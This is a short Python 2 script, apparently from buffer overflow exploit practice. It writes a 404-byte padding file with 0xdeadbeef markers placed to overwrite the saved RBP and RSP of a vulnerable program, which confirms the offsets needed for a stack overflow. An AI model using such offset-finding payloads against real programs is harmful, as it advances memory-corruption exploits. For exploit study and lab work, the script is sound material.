
filename="confirmOffset"
max_payload_size=404
#RBP present at 125th position & RSP at position is 137. Both should have "deadbeef"
msg="A"*124+"\xef\xbe\xad\xde"+"B"*8+"\xef\xbe\xad\xde"+"A"*(max_payload_size-(136+4))

with open("confirmOffset","wb") as f:
    f.write(msg)

print "FileSize is :"+ str(len(msg))
